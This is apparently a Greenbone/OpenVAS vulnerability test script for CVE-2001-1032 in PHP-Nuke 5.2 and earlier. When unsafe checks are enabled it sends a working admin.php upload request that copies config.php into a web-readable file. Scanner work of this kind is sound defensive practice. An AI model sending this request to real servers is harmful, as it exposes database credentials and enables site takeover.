# SPDX-FileCopyrightText: 2001 SecurITeam
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:phpnuke:php-nuke";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10772");
  script_version("2025-09-19T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-19 15:40:40 +0000 (Fri, 19 Sep 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-1032");
  script_name("PHP-Nuke <= 5.2 Arbitrary File Upload Vulnerability");
  # nb: File upload thus the safe_checks() and this category.
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2001 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("secpod_php_nuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("php-nuke/installed");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210221145231/https://www.securityfocus.com/bid/3361");

  script_tag(name:"summary", value:"PHP-Nuke is prone to an arbitrary file upload vulnerability in
  admin.php.");

  script_tag(name:"vuldetect", value:"Depending on the 'safe_checks' setting of the scan
  configuration:

  - Setting 'yes': Checks if a vulnerable version is present on the target host

  - Setting 'no': Tries to upload a file via a HTTP GET request and checks if it is accessible
  afterwards");

  script_tag(name:"insight", value:"The vulnerability is caused by inadequate processing of queries
  by PHP-Nuke's admin.php which enables attackers to copy any file from the operating system to
  anywhere else on the operating system.");

  script_tag(name:"impact", value:"Every file that the webserver has access to can be read by
  anyone.

  Furthermore, any file can be overwritten. Usernames (used for database access) can be compromised.
  Administrative privileges can be gained by copying sensitive files.");

  script_tag(name:"affected", value:"PHP-Nuke versions 5.2 and prior, except 5.0RC1 are known to be
  affected Other versions might be affected as well.");

  script_tag(name:"solution", value:"- Update to version 5.3 or later

  - As a workaround change the following lines in admin.php:

  if($upload)

  To:

  if(($upload) && ($admintest))");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

dir = infos["location"];
rep_dir = dir;

if( ! safe_checks() ) {

  if( dir == "/" )
    dir = "";

  vtstrings = get_vt_strings();

  url = dir + "/admin.php?upload=1&file=config.php&file_name=" + vtstrings["lowercase"] + ".txt&wdir=/images/&userfile=config.php&userfile_name=" + vtstrings["lowercase"] + ".txt";
  req = http_get( item:url, port:port );
  http_keepalive_send_recv( port:port, data:req );

  req = http_get( item:"/images/" + vtstrings["lowercase"] + ".txt", port:port );
  buf = http_keepalive_send_recv( port:port, data:req );

  if( "PHP-NUKE: Web Portal System" >< buf && ( "?php" >< buf || "?PHP" >< buf ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

if( ! version = infos["version"] )
  exit( 0 );

if( version_is_less_equal( version:version, test_version:"5.2" ) ) {
  report = report_fixed_ver( installed_version:version, fixed_version:"5.3", install_url:rep_dir );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
